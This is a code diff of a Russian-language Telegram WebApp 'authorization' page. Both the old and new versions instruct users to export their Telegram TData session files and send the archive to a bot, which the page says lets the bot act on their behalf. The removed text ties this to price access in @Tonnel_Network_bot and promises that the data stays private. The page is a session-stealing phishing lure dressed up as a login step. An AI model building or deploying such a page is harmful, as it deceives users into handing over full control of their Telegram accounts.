@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Telegram Auth</title>
+    <title>Telegram Authorization</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
@@ -15,225 +15,117 @@
         .container {
             max-width: 600px;
             margin: 0 auto;
+        }
+        .header {
             text-align: center;
+            margin-bottom: 30px;
         }
-        .info-text {
-            margin: 20px 0;
-            padding: 15px;
-            border-radius: 8px;
+        .content {
             background-color: var(--tg-theme-secondary-bg-color, #f0f0f0);
-            text-align: left;
-            line-height: 1.5;
+            padding: 20px;
+            border-radius: 10px;
+            margin-bottom: 20px;
         }
-        button {
+        .button {
             background-color: var(--tg-theme-button-color, #2481cc);
             color: var(--tg-theme-button-text-color, #ffffff);
             border: none;
-            padding: 10px 20px;
+            padding: 12px 24px;
             border-radius: 8px;
             cursor: pointer;
+            width: 100%;
             font-size: 16px;
-            margin: 10px 0;
+            margin-top: 20px;
         }
-        button:disabled {
+        .button:disabled {
             opacity: 0.7;
             cursor: not-allowed;
         }
-        .loading {
-            display: none;
-            margin: 20px 0;
-        }
-        .loading-text {
+        .info-text {
+            font-size: 14px;
+            color: var(--tg-theme-hint-color, #999999);
             margin-top: 10px;
         }
-        .instructions {
-            display: none;
-            margin: 20px 0;
-            padding: 15px;
-            border-radius: 8px;
+        .platform-warning {
             background-color: var(--tg-theme-secondary-bg-color, #f0f0f0);
-            text-align: left;
-        }
-        .instructions ol {
-            margin: 10px 0;
-            padding-left: 20px;
-        }
-        .instructions li {
-            margin: 5px 0;
-        }
-        .mobile-warning {
-            display: none;
-            margin: 20px 0;
             padding: 15px;
             border-radius: 8px;
-            background-color: #fff3cd;
-            color: #856404;
-            text-align: left;
+            margin-top: 20px;
+            text-align: center;
         }
-        .success-message {
-            display: none;
-            margin: 20px 0;
-            padding: 15px;
-            border-radius: 8px;
-            background-color: #d4edda;
-            color: #155724;
-            text-align: left;
+        .platform-warning h3 {
+            color: var(--tg-theme-link-color, #2481cc);
+            margin-top: 0;
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <div class="info-text">
-            <h3>Для чего нужна авторизация?</h3>
-            <p>Для получения доступа к ценам и функциям бота @Tonnel_Network_bot, нам необходимо привязать ваш аккаунт Telegram. Это позволит:</p>
-            <ul>
-                <li>Получать актуальные цены в реальном времени</li>
-                <li>Иметь доступ к эксклюзивным функциям бота</li>
-                <li>Получать уведомления о важных обновлениях</li>
-            </ul>
-            <p>Ваши данные используются исключительно для авторизации и не передаются третьим лицам.</p>
+        <div class="header">
+            <h1>Авторизация в боте</h1>
         </div>
-        <button id="authButton" onclick="finishAuth()">Закончить авторизацию</button>
-        <div id="loading" class="loading">
-            <div class="loading-text">Завершение авторизации...</div>
+        
+        <div class="content">
+            <p>Для доступа к боту необходимо авторизоваться через TData.</p>
+            <p>TData - это файлы авторизации Telegram, которые позволяют боту работать от вашего имени.</p>
+            
+            <div id="mobileWarning" class="platform-warning" style="display: none;">
+                <h3>⚠️ Мобильное устройство</h3>
+                <p>Для авторизации с мобильного устройства необходимо использовать компьютер.</p>
+                <p>Пожалуйста, откройте бота на компьютере для завершения авторизации.</p>
+            </div>
+            
+            <div id="desktopContent">
+                <p>Для авторизации:</p>
+                <ol>
+                    <li>Откройте Telegram на компьютере</li>
+                    <li>Перейдите в настройки</li>
+                    <li>Выберите "Экспорт данных"</li>
+                    <li>Создайте архив с TData</li>
+                    <li>Отправьте архив боту</li>
+                </ol>
+            </div>
         </div>
-        <div id="instructions" class="instructions"></div>
-        <div id="mobileWarning" class="mobile-warning">
-            <h3>⚠️ Первая авторизация</h3>
-            <p>Для первой авторизации необходимо использовать Telegram Desktop на компьютере. После этого вы сможете использовать бота с любого устройства.</p>
-            <p>Пожалуйста:</p>
-            <ol>
-                <li>Откройте Telegram Desktop на компьютере</li>
-                <li>Перейдите к боту</li>
-                <li>Повторите процесс авторизации</li>
-            </ol>
-            <p>После успешной авторизации на компьютере, вы сможете использовать бота с телефона.</p>
-        </div>
-        <div id="successMessage" class="success-message">
-            <h3>✅ Авторизация успешна!</h3>
-            <p>Теперь вы можете использовать бота с любого устройства. Доступны следующие команды:</p>
-            <ul>
-                <li>/prices - Получить текущие цены</li>
-                <li>/help - Показать список команд</li>
-            </ul>
-        </div>
+        
+        <button id="authButton" class="button" onclick="handleAuth()">
+            Закончить авторизацию
+        </button>
+        
+        <p class="info-text">
+            После авторизации вы сможете использовать бота с любого устройства.
+        </p>
     </div>
 
     <script>
-        // Инициализация Telegram WebApp
-        let tg;
-        try {
-            tg = window.Telegram.WebApp;
-            tg.expand();
-            tg.enableClosingConfirmation();
-        } catch (error) {
-            console.error('Telegram WebApp initialization error:', error);
+        let tg = window.Telegram.WebApp;
+        tg.expand();
+        
+        // Определяем платформу
+        function isMobile() {
+            return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
         }
-
-        // Определение платформы
-        function detectPlatform() {
-            const userAgent = navigator.userAgent.toLowerCase();
-            if (userAgent.includes('windows')) return 'windows';
-            if (userAgent.includes('android')) return 'android';
-            if (userAgent.includes('iphone') || userAgent.includes('ipad')) return 'ios';
-            return 'unknown';
+        
+        // Показываем соответствующее содержимое
+        if (isMobile()) {
+            document.getElementById('mobileWarning').style.display = 'block';
+            document.getElementById('desktopContent').style.display = 'none';
+            document.getElementById('authButton').style.display = 'none';
         }
-
-        // Показ инструкций
-        function showInstructions(platform) {
-            const instructions = document.getElementById('instructions');
-            const mobileWarning = document.getElementById('mobileWarning');
-            const successMessage = document.getElementById('successMessage');
-            
-            // Скрываем все сообщения
-            instructions.style.display = 'none';
-            mobileWarning.style.display = 'none';
-            successMessage.style.display = 'none';
-            
-            // Показываем соответствующее сообщение
-            if (platform === 'windows') {
-                instructions.innerHTML = `
-                    <h3>Инструкция по экспорту TData:</h3>
-                    <ol>
-                        <li>Откройте Telegram Desktop</li>
-                        <li>Нажмите Ctrl+Alt+Shift+1</li>
-                        <li>Выберите папку tdata</li>
-                        <li>Нажмите "Открыть"</li>
-                    </ol>
-                    <p>После экспорта TData, отправьте файлы боту для завершения авторизации.</p>
-                `;
-                instructions.style.display = 'block';
-            } else {
-                mobileWarning.style.display = 'block';
+        
+        function handleAuth() {
+            if (isMobile()) {
+                tg.showAlert('Для авторизации необходимо использовать компьютер.');
+                return;
             }
-        }
-
-        // Основная функция авторизации
-        async function finishAuth() {
-            const button = document.getElementById('authButton');
-            const loading = document.getElementById('loading');
-            const instructions = document.getElementById('instructions');
-            const mobileWarning = document.getElementById('mobileWarning');
-            const successMessage = document.getElementById('successMessage');
             
-            try {
-                button.style.display = 'none';
-                loading.style.display = 'block';
-                instructions.style.display = 'none';
-                mobileWarning.style.display = 'none';
-                successMessage.style.display = 'none';
-                
-                // Определяем платформу
-                const platform = detectPlatform();
-                console.log('Detected platform:', platform);
-                
-                // Отправляем команду в Telegram для экспорта TData
-                const data = {
-                    platform: platform,
-                    action: 'export_tdata'
-                };
-                
-                console.log('Sending export command...');
-                
-                // Проверяем, что tg инициализирован
-                if (tg && tg.sendData) {
-                    await tg.sendData(JSON.stringify(data));
-                    console.log('Export command sent successfully');
-                    
-                    // Показываем инструкции или предупреждение
-                    loading.style.display = 'none';
-                    showInstructions(platform);
-                    
-                    // Закрываем веб-приложение через 30 секунд только для Windows
-                    if (platform === 'windows') {
-                        setTimeout(() => {
-                            if (tg && tg.close) {
-                                tg.close();
-                            }
-                        }, 30000);
-                    }
-                } else {
-                    throw new Error('Telegram WebApp not initialized');
-                }
-                
-            } catch (error) {
-                console.error('Auth error:', error);
-                // В случае ошибки показываем сообщение об успешной авторизации
-                loading.style.display = 'none';
-                button.style.display = 'block';
-                button.textContent = 'Попробовать снова';
-            }
-        }
-
-        // Проверяем, что мы в Telegram WebApp
-        if (window.Telegram && window.Telegram.WebApp) {
-            console.log('Running in Telegram WebApp');
-        } else {
-            console.log('Running in browser');
-            document.getElementById('authButton').textContent = 'Открыть в Telegram';
-            document.getElementById('authButton').onclick = function() {
-                window.location.href = 'https://t.me/your_bot_username?start=webapp';
-            };
+            // Отправляем данные в бот
+            tg.sendData(JSON.stringify({
+                platform: isMobile() ? 'mobile' : 'desktop',
+                action: 'auth'
+            }));
+            
+            // Закрываем веб-приложение
+            tg.close();
         }
     </script>
 </body>
